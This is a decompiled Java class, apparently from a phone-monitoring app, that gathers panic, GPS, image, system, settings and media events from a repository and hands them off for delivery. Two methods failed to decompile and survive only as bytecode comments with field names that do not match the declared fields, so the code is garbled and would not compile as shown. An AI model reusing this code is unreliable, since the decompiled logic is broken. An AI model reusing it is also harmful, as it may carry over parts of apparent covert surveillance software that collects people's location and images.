package com.vvt.eventdelivery;

import com.vvt.base.FxEvent;
import com.vvt.eventrepository.eventresult.EventKeys;
import com.vvt.eventrepository.eventresult.d;
import com.vvt.phoenix.prot.command.e;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a
  implements e
{
  private static final boolean a;
  private static final boolean b;
  private EventDelivery.Type c;
  private com.vvt.eventrepository.b d;
  private Iterator e;
  private String f;
  private int g;
  private int h;
  
  static
  {
    boolean bool = com.vvt.datadeliverymanager.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.datadeliverymanager.a.e;
      return;
    }
  }
  
  a(com.vvt.eventrepository.b paramb, EventDelivery.Type paramType, String paramString, int paramInt)
  {
    this.d = paramb;
    this.c = paramType;
    this.f = paramString;
    this.h = paramInt;
    this.g = 0;
    Object localObject = EventDelivery.Type.TYPE_NONE_REGULAR_ACTUAL_MEDIA;
    int i;
    if (paramType == localObject)
    {
      i = 1;
      localObject = a(i);
      if (localObject != null)
      {
        localObject = ((d)localObject).a();
        if (localObject != null) {
          break label89;
        }
        i = 0;
        localObject = null;
      }
    }
    for (;;)
    {
      this.g = i;
      return;
      i = 25;
      break;
      label89:
      i = ((List)localObject).size();
    }
  }
  
  /* Error */
  private d a(int paramInt)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_2
    //   2: iconst_0
    //   3: istore_3
    //   4: aconst_null
    //   5: astore 4
    //   7: getstatic 26	com/vvt/eventdelivery/a:a	Z
    //   10: istore 5
    //   12: iload 5
    //   14: ifeq +3 -> 17
    //   17: getstatic 26	com/vvt/eventdelivery/a:a	Z
    //   20: istore 5
    //   22: iload 5
    //   24: ifeq +3 -> 27
    //   27: aload_0
    //   28: getfield 38	com/vvt/eventdelivery/a:MyUncaughtExceptionHandler	Lcom/vvt/eventdelivery/EventDelivery$Type;
    //   31: astore 6
    //   33: getstatic 67	com/vvt/eventdelivery/EventDelivery$Type:TYPE_PANIC	Lcom/vvt/eventdelivery/EventDelivery$Type;
    //   36: astore 7
    //   38: aload 6
    //   40: aload 7
    //   42: if_acmpne +201 -> 243
    //   45: new 69	com/vvt/eventrepository/querycriteria/removeFromPath
    //   48: astore 6
    //   50: aload 6
    //   52: invokespecial 70	com/vvt/eventrepository/querycriteria/removeFromPath:<init>	()V
    //   55: getstatic 76	com/vvt/base/FxEventType:PANIC_STATUS	Lcom/vvt/base/FxEventType;
    //   58: astore 7
    //   60: aload 6
    //   62: aload 7
    //   64: invokevirtual 79	com/vvt/eventrepository/querycriteria/removeFromPath:a	(Lcom/vvt/base/FxEventType;)V
    //   67: aload 6
    //   69: iload_1
    //   70: invokevirtual 82	com/vvt/eventrepository/querycriteria/removeFromPath:a	(I)V
    //   73: getstatic 88	com/vvt/eventrepository/querycriteria/QueryOrder:QueryNewestFirst	Lcom/vvt/eventrepository/querycriteria/QueryOrder;
    //   76: astore 7
    //   78: aload 6
    //   80: aload 7
    //   82: invokevirtual 91	com/vvt/eventrepository/querycriteria/removeFromPath:a	(Lcom/vvt/eventrepository/querycriteria/QueryOrder;)V
    //   85: aload_0
    //   86: getfield 36	com/vvt/eventdelivery/a:d	Lcom/vvt/eventrepository/removeFromPath;
    //   89: astore 7
    //   91: aload 7
    //   93: aload 6
    //   95: invokeinterface 96 2 0
    //   100: astore 6
    //   102: aload 6
    //   104: ifnull +10 -> 114
    //   107: aload 6
    //   109: invokevirtual 57	com/vvt/eventrepository/eventresult/d:a	()Ljava/util/List;
    //   112: astore 4
    //   114: aload 4
    //   116: ifnull +16 -> 132
    //   119: aload 4
    //   121: invokeinterface 64 1 0
    //   126: istore_3
    //   127: iload_3
    //   128: iload_2
    //   129: if_icmpge +84 -> 213
    //   132: new 69	com/vvt/eventrepository/querycriteria/removeFromPath
    //   135: astore 4
    //   137: aload 4
    //   139: invokespecial 70	com/vvt/eventrepository/querycriteria/removeFromPath:<init>	()V
    //   142: getstatic 99	com/vvt/base/FxEventType:PANIC_GPS	Lcom/vvt/base/FxEventType;
    //   145: astore 7
    //   147: aload 4
    //   149: aload 7
    //   151: invokevirtual 79	com/vvt/eventrepository/querycriteria/removeFromPath:a	(Lcom/vvt/base/FxEventType;)V
    //   154: getstatic 102	com/vvt/base/FxEventType:PANIC_IMAGE	Lcom/vvt/base/FxEventType;
    //   157: astore 7
    //   159: aload 4
    //   161: aload 7
    //   163: invokevirtual 79	com/vvt/eventrepository/querycriteria/removeFromPath:a	(Lcom/vvt/base/FxEventType;)V
    //   166: getstatic 105	com/vvt/base/FxEventType:ALERT_GPS	Lcom/vvt/base/FxEventType;
    //   169: astore 7
    //   171: aload 4
    //   173: aload 7
    //   175: invokevirtual 79	com/vvt/eventrepository/querycriteria/removeFromPath:a	(Lcom/vvt/base/FxEventType;)V
    //   178: aload 4
    //   180: iload_1
    //   181: invokevirtual 82	com/vvt/eventrepository/querycriteria/removeFromPath:a	(I)V
    //   184: getstatic 88	com/vvt/eventrepository/querycriteria/QueryOrder:QueryNewestFirst	Lcom/vvt/eventrepository/querycriteria/QueryOrder;
    //   187: astore 7
    //   189: aload 4
    //   191: aload 7
    //   193: invokevirtual 91	com/vvt/eventrepository/querycriteria/removeFromPath:a	(Lcom/vvt/eventrepository/querycriteria/QueryOrder;)V
    //   196: aload_0
    //   197: getfield 36	com/vvt/eventdelivery/a:d	Lcom/vvt/eventrepository/removeFromPath;
    //   200: astore 7
    //   202: aload 7
    //   204: aload 4
    //   206: invokeinterface 96 2 0
    //   211: astore 6
    //   213: aload 6
    //   215: ifnonnull +9 -> 224
    //   218: aload_0
    //   219: invokespecial 108	com/vvt/eventdelivery/a:d	()Lcom/vvt/eventrepository/eventresult/d;
    //   222: astore 6
    //   224: getstatic 26	com/vvt/eventdelivery/a:a	Z
    //   227: istore_3
    //   228: iload_3
    //   229: ifeq +3 -> 232
    //   232: getstatic 26	com/vvt/eventdelivery/a:a	Z
    //   235: istore_3
    //   236: iload_3
    //   237: ifeq +3 -> 240
    //   240: aload 6
    //   242: areturn
    //   243: aload_0
    //   244: getfield 38	com/vvt/eventdelivery/a:MyUncaughtExceptionHandler	Lcom/vvt/eventdelivery/EventDelivery$Type;
    //   247: astore 6
    //   249: getstatic 111	com/vvt/eventdelivery/EventDelivery$Type:TYPE_SYSTEM	Lcom/vvt/eventdelivery/EventDelivery$Type;
    //   252: astore 7
    //   254: aload 6
    //   256: aload 7
    //   258: if_acmpne +63 -> 321
    //   261: new 69	com/vvt/eventrepository/querycriteria/removeFromPath
    //   264: astore 6
    //   266: aload 6
    //   268: invokespecial 70	com/vvt/eventrepository/querycriteria/removeFromPath:<init>	()V
    //   271: getstatic 114	com/vvt/base/FxEventType:SYSTEM	Lcom/vvt/base/FxEventType;
    //   274: astore 7
    //   276: aload 6
    //   278: aload 7
    //   280: invokevirtual 79	com/vvt/eventrepository/querycriteria/removeFromPath:a	(Lcom/vvt/base/FxEventType;)V
    //   283: aload 6
    //   285: iload_1
    //   286: invokevirtual 82	com/vvt/eventrepository/querycriteria/removeFromPath:a	(I)V
    //   289: getstatic 117	com/vvt/eventrepository/querycriteria/QueryOrder:QueryOldestFist	Lcom/vvt/eventrepository/querycriteria/QueryOrder;
    //   292: astore 7
    //   294: aload 6
    //   296: aload 7
    //   298: invokevirtual 91	com/vvt/eventrepository/querycriteria/removeFromPath:a	(Lcom/vvt/eventrepository/querycriteria/QueryOrder;)V
    //   301: aload_0
    //   302: getfield 36	com/vvt/eventdelivery/a:d	Lcom/vvt/eventrepository/removeFromPath;
    //   305: astore 7
    //   307: aload 7
    //   309: aload 6
    //   311: invokeinterface 96 2 0
    //   316: astore 6
    //   318: goto -105 -> 213
    //   321: aload_0
    //   322: getfield 38	com/vvt/eventdelivery/a:MyUncaughtExceptionHandler	Lcom/vvt/eventdelivery/EventDelivery$Type;
    //   325: astore 6
    //   327: getstatic 120	com/vvt/eventdelivery/EventDelivery$Type:TYPE_SETTINGS	Lcom/vvt/eventdelivery/EventDelivery$Type;
    //   330: astore 7
    //   332: aload 6
    //   334: aload 7
    //   336: if_acmpne +63 -> 399
    //   339: new 69	com/vvt/eventrepository/querycriteria/removeFromPath
    //   342: astore 6
    //   344: aload 6
    //   346: invokespecial 70	com/vvt/eventrepository/querycriteria/removeFromPath:<init>	()V
    //   349: getstatic 123	com/vvt/base/FxEventType:SETTINGS	Lcom/vvt/base/FxEventType;
    //   352: astore 7
    //   354: aload 6
    //   356: aload 7
    //   358: invokevirtual 79	com/vvt/eventrepository/querycriteria/removeFromPath:a	(Lcom/vvt/base/FxEventType;)V
    //   361: aload 6
    //   363: iload_1
    //   364: invokevirtual 82	com/vvt/eventrepository/querycriteria/removeFromPath:a	(I)V
    //   367: getstatic 88	com/vvt/eventrepository/querycriteria/QueryOrder:QueryNewestFirst	Lcom/vvt/eventrepository/querycriteria/QueryOrder;
    //   370: astore 7
    //   372: aload 6
    //   374: aload 7
    //   376: invokevirtual 91	com/vvt/eventrepository/querycriteria/removeFromPath:a	(Lcom/vvt/eventrepository/querycriteria/QueryOrder;)V
    //   379: aload_0
    //   380: getfield 36	com/vvt/eventdelivery/a:d	Lcom/vvt/eventrepository/removeFromPath;
    //   383: astore 7
    //   385: aload 7
    //   387: aload 6
    //   389: invokeinterface 96 2 0
    //   394: astore 6
    //   396: goto -183 -> 213
    //   399: aload_0
    //   400: getfield 38	com/vvt/eventdelivery/a:MyUncaughtExceptionHandler	Lcom/vvt/eventdelivery/EventDelivery$Type;
    //   403: astore 6
    //   405: getstatic 126	com/vvt/eventdelivery/EventDelivery$Type:TYPE_REGULAR	Lcom/vvt/eventdelivery/EventDelivery$Type;
    //   408: astore 7
    //   410: aload 6
    //   412: aload 7
    //   414: if_acmpne +98 -> 512
    //   417: new 69	com/vvt/eventrepository/querycriteria/removeFromPath
    //   420: astore 7
    //   422: aload 7
    //   424: invokespecial 70	com/vvt/eventrepository/querycriteria/removeFromPath:<init>	()V
    //   427: aload 7
    //   429: iload_1
    //   430: invokevirtual 82	com/vvt/eventrepository/querycriteria/removeFromPath:a	(I)V
    //   433: getstatic 88	com/vvt/eventrepository/querycriteria/QueryOrder:QueryNewestFirst	Lcom/vvt/eventrepository/querycriteria/QueryOrder;
    //   436: astore 6
    //   438: aload 7
    //   440: aload 6
    //   442: invokevirtual 91	com/vvt/eventrepository/querycriteria/removeFromPath:a	(Lcom/vvt/eventrepository/querycriteria/QueryOrder;)V
    //   445: aload_0
    //   446: getfield 36	com/vvt/eventdelivery/a:d	Lcom/vvt/eventrepository/removeFromPath;
    //   449: astore 6
    //   451: aload 6
    //   453: aload 7
    //   455: invokeinterface 96 2 0
    //   460: astore 6
    //   462: aload 6
    //   464: ifnull +10 -> 474
    //   467: aload 6
    //   469: invokevirtual 57	com/vvt/eventrepository/eventresult/d:a	()Ljava/util/List;
    //   472: astore 4
    //   474: aload 4
    //   476: ifnull +16 -> 492
    //   479: aload 4
    //   481: invokeinterface 64 1 0
    //   486: istore_3
    //   487: iload_3
    //   488: iload_2
    //   489: if_icmpge -276 -> 213
    //   492: aload_0
    //   493: getfield 36	com/vvt/eventdelivery/a:d	Lcom/vvt/eventrepository/removeFromPath;
    //   496: astore 4
    //   498: aload 4
    //   500: aload 7
    //   502: invokeinterface 128 2 0
    //   507: astore 6
    //   509: goto -296 -> 213
    //   512: aload_0
    //   513: getfield 38	com/vvt/eventdelivery/a:MyUncaughtExceptionHandler	Lcom/vvt/eventdelivery/EventDelivery$Type;
    //   516: astore 6
    //   518: getstatic 49	com/vvt/eventdelivery/EventDelivery$Type:TYPE_NONE_REGULAR_ACTUAL_MEDIA	Lcom/vvt/eventdelivery/EventDelivery$Type;
    //   521: astore 7
    //   523: aload 6
    //   525: aload 7
    //   527: if_acmpne +51 -> 578
    //   530: new 69	com/vvt/eventrepository/querycriteria/removeFromPath
    //   533: astore 6
    //   535: aload 6
    //   537: invokespecial 70	com/vvt/eventrepository/querycriteria/removeFromPath:<init>	()V
    //   540: aload 6
    //   542: iload_1
    //   543: invokevirtual 82	com/vvt/eventrepository/querycriteria/removeFromPath:a	(I)V
    //   546: getstatic 88	com/vvt/eventrepository/querycriteria/QueryOrder:QueryNewestFirst	Lcom/vvt/eventrepository/querycriteria/QueryOrder;
    //   549: astore 7
    //   551: aload 6
    //   553: aload 7
    //   555: invokevirtual 91	com/vvt/eventrepository/querycriteria/removeFromPath:a	(Lcom/vvt/eventrepository/querycriteria/QueryOrder;)V
    //   558: aload_0
    //   559: getfield 36	com/vvt/eventdelivery/a:d	Lcom/vvt/eventrepository/removeFromPath;
    //   562: astore 7
    //   564: aload 7
    //   566: aload 6
    //   568: invokeinterface 130 2 0
    //   573: astore 6
    //   575: goto -362 -> 213
    //   578: aload_0
    //   579: getfield 38	com/vvt/eventdelivery/a:MyUncaughtExceptionHandler	Lcom/vvt/eventdelivery/EventDelivery$Type;
    //   582: astore 6
    //   584: getstatic 133	com/vvt/eventdelivery/EventDelivery$Type:TYPE_ACTUAL_MEDIA	Lcom/vvt/eventdelivery/EventDelivery$Type;
    //   587: astore 7
    //   589: aload 6
    //   591: aload 7
    //   593: if_acmpne +111 -> 704
    //   596: aload_0
    //   597: getfield 36	com/vvt/eventdelivery/a:d	Lcom/vvt/eventrepository/removeFromPath;
    //   600: astore 6
    //   602: aload_0
    //   603: getfield 42	com/vvt/eventdelivery/a:AppEngine1	I
    //   606: istore 8
    //   608: iload 8
    //   610: i2l
    //   611: lstore 9
    //   613: aload 6
    //   615: lload 9
    //   617: invokeinterface 136 3 0
    //   622: astore 6
    //   624: aload 6
    //   626: ifnull +78 -> 704
    //   629: new 138	java/util/ArrayList
    //   632: astore 7
    //   634: aload 7
    //   636: invokespecial 139	java/util/ArrayList:<init>	()V
    //   639: aload 7
    //   641: aload 6
    //   643: invokevirtual 143	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   646: pop
    //   647: new 54	com/vvt/eventrepository/eventresult/d
    //   650: astore 6
    //   652: aload 6
    //   654: invokespecial 144	com/vvt/eventrepository/eventresult/d:<init>	()V
    //   657: aload 6
    //   659: aload 7
    //   661: invokevirtual 147	com/vvt/eventrepository/eventresult/d:a	(Ljava/util/List;)V
    //   664: goto -451 -> 213
    //   667: astore 4
    //   669: aload 6
    //   671: astore 4
    //   673: getstatic 30	com/vvt/eventdelivery/a:removeFromPath	Z
    //   676: istore 5
    //   678: iload 5
    //   680: ifeq +3 -> 683
    //   683: aload 4
    //   685: astore 6
    //   687: goto -474 -> 213
    //   690: astore 6
    //   692: goto -19 -> 673
    //   695: astore 4
    //   697: aload 6
    //   699: astore 4
    //   701: goto -28 -> 673
    //   704: iconst_0
    //   705: istore 5
    //   707: aconst_null
    //   708: astore 6
    //   710: goto -497 -> 213
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	713	0	this	a
    //   0	713	1	paramInt	int
    //   1	489	2	i	int
    //   3	127	3	j	int
    //   227	10	3	bool1	boolean
    //   486	4	3	k	int
    //   5	494	4	localObject1	Object
    //   667	1	4	localObject2	Object
    //   671	13	4	localObject3	Object
    //   695	1	4	localObject4	Object
    //   699	1	4	localObject5	Object
    //   10	696	5	bool2	boolean
    //   31	655	6	localObject6	Object
    //   690	8	6	localObject7	Object
    //   708	1	6	localObject8	Object
    //   36	624	7	localObject9	Object
    //   606	3	8	m	int
    //   611	5	9	l	long
    // Exception table:
    //   from	to	target	type
    //   659	664	667	finally
    //   17	20	690	finally
    //   27	31	690	finally
    //   33	36	690	finally
    //   45	48	690	finally
    //   50	55	690	finally
    //   55	58	690	finally
    //   62	67	690	finally
    //   69	73	690	finally
    //   73	76	690	finally
    //   80	85	690	finally
    //   85	89	690	finally
    //   93	100	690	finally
    //   243	247	690	finally
    //   249	252	690	finally
    //   261	264	690	finally
    //   266	271	690	finally
    //   271	274	690	finally
    //   278	283	690	finally
    //   285	289	690	finally
    //   289	292	690	finally
    //   296	301	690	finally
    //   301	305	690	finally
    //   309	316	690	finally
    //   321	325	690	finally
    //   327	330	690	finally
    //   339	342	690	finally
    //   344	349	690	finally
    //   349	352	690	finally
    //   356	361	690	finally
    //   363	367	690	finally
    //   367	370	690	finally
    //   374	379	690	finally
    //   379	383	690	finally
    //   387	394	690	finally
    //   399	403	690	finally
    //   405	408	690	finally
    //   417	420	690	finally
    //   422	427	690	finally
    //   429	433	690	finally
    //   433	436	690	finally
    //   440	445	690	finally
    //   445	449	690	finally
    //   453	460	690	finally
    //   512	516	690	finally
    //   518	521	690	finally
    //   530	533	690	finally
    //   535	540	690	finally
    //   542	546	690	finally
    //   546	549	690	finally
    //   553	558	690	finally
    //   558	562	690	finally
    //   566	573	690	finally
    //   578	582	690	finally
    //   584	587	690	finally
    //   596	600	690	finally
    //   602	606	690	finally
    //   615	622	690	finally
    //   629	632	690	finally
    //   634	639	690	finally
    //   641	647	690	finally
    //   647	650	690	finally
    //   652	657	690	finally
    //   107	112	695	finally
    //   119	126	695	finally
    //   132	135	695	finally
    //   137	142	695	finally
    //   142	145	695	finally
    //   149	154	695	finally
    //   154	157	695	finally
    //   161	166	695	finally
    //   166	169	695	finally
    //   173	178	695	finally
    //   180	184	695	finally
    //   184	187	695	finally
    //   191	196	695	finally
    //   196	200	695	finally
    //   204	211	695	finally
    //   467	472	695	finally
    //   479	486	695	finally
    //   492	496	695	finally
    //   500	507	695	finally
  }
  
  /* Error */
  private boolean a(java.io.Serializable paramSerializable, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: iconst_0
    //   3: istore 4
    //   5: aconst_null
    //   6: astore 5
    //   8: new 149	java/io/File
    //   11: astore 6
    //   13: aload 6
    //   15: aload_2
    //   16: invokespecial 152	java/io/File:<init>	(Ljava/lang/String;)V
    //   19: aload 6
    //   21: invokevirtual 156	java/io/File:createNewFile	()Z
    //   24: pop
    //   25: new 158	java/io/FileOutputStream
    //   28: astore 7
    //   30: aload 7
    //   32: aload 6
    //   34: invokespecial 161	java/io/FileOutputStream:<init>	(Ljava/io/File;)V
    //   37: new 163	java/io/ObjectOutputStream
    //   40: astore 6
    //   42: aload 6
    //   44: aload 7
    //   46: invokespecial 166	java/io/ObjectOutputStream:<init>	(Ljava/io/OutputStream;)V
    //   49: aload 6
    //   51: aload_1
    //   52: invokevirtual 170	java/io/ObjectOutputStream:writeObject	(Ljava/lang/Object;)V
    //   55: aload 6
    //   57: invokevirtual 173	java/io/ObjectOutputStream:flush	()V
    //   60: iconst_1
    //   61: istore 4
    //   63: aload 7
    //   65: invokestatic 177	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   68: aload 6
    //   70: invokestatic 180	com/vvt/io/d:a	(Ljava/io/ObjectOutputStream;)V
    //   73: iload 4
    //   75: ireturn
    //   76: astore 7
    //   78: aconst_null
    //   79: astore 7
    //   81: getstatic 30	com/vvt/eventdelivery/a:removeFromPath	Z
    //   84: istore 8
    //   86: iload 8
    //   88: ifeq +3 -> 91
    //   91: aload 7
    //   93: invokestatic 177	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   96: aload_3
    //   97: invokestatic 180	com/vvt/io/d:a	(Ljava/io/ObjectOutputStream;)V
    //   100: goto -27 -> 73
    //   103: astore 5
    //   105: aconst_null
    //   106: astore 7
    //   108: aload 7
    //   110: invokestatic 177	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   113: aload_3
    //   114: invokestatic 180	com/vvt/io/d:a	(Ljava/io/ObjectOutputStream;)V
    //   117: aload 5
    //   119: athrow
    //   120: astore 5
    //   122: goto -14 -> 108
    //   125: astore 5
    //   127: aload 6
    //   129: astore_3
    //   130: goto -22 -> 108
    //   133: astore 6
    //   135: goto -54 -> 81
    //   138: astore_3
    //   139: aload 6
    //   141: astore_3
    //   142: goto -61 -> 81
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	145	0	this	a
    //   0	145	1	paramSerializable	java.io.Serializable
    //   0	145	2	paramString	String
    //   1	129	3	localObject1	Object
    //   138	1	3	localIOException1	java.io.IOException
    //   141	1	3	localObject2	Object
    //   3	71	4	bool1	boolean
    //   6	1	5	localObject3	Object
    //   103	15	5	localObject4	Object
    //   120	1	5	localObject5	Object
    //   125	1	5	localObject6	Object
    //   11	117	6	localObject7	Object
    //   133	7	6	localIOException2	java.io.IOException
    //   28	36	7	localFileOutputStream	java.io.FileOutputStream
    //   76	1	7	localIOException3	java.io.IOException
    //   79	30	7	localOutputStream	java.io.OutputStream
    //   84	3	8	bool2	boolean
    // Exception table:
    //   from	to	target	type
    //   8	11	76	java/io/IOException
    //   15	19	76	java/io/IOException
    //   19	25	76	java/io/IOException
    //   25	28	76	java/io/IOException
    //   32	37	76	java/io/IOException
    //   8	11	103	finally
    //   15	19	103	finally
    //   19	25	103	finally
    //   25	28	103	finally
    //   32	37	103	finally
    //   37	40	120	finally
    //   44	49	120	finally
    //   81	84	120	finally
    //   51	55	125	finally
    //   55	60	125	finally
    //   37	40	133	java/io/IOException
    //   44	49	133	java/io/IOException
    //   51	55	138	java/io/IOException
    //   55	60	138	java/io/IOException
  }
  
  private d d()
  {
    d locald = new com/vvt/eventrepository/eventresult/d;
    locald.<init>();
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    locald.a(localArrayList);
    return locald;
  }
  
  public boolean a()
  {
    Object localObject = this.e;
    if (localObject == null)
    {
      int i = this.g;
      localObject = a(i);
      EventKeys localEventKeys = ((d)localObject).b();
      String str = this.f;
      EventDelivery.Type localType = this.c;
      str = b.a(str, localType);
      boolean bool = a(localEventKeys, str);
      if (!bool) {
        localObject = d();
      }
      localObject = ((d)localObject).a().iterator();
      this.e = ((Iterator)localObject);
    }
    return this.e.hasNext();
  }
  
  public Object b()
  {
    FxEvent localFxEvent = (FxEvent)this.e.next();
    boolean bool = a;
    if (bool) {}
    return g.a(localFxEvent);
  }
  
  public int c()
  {
    return this.g;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/eventdelivery/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */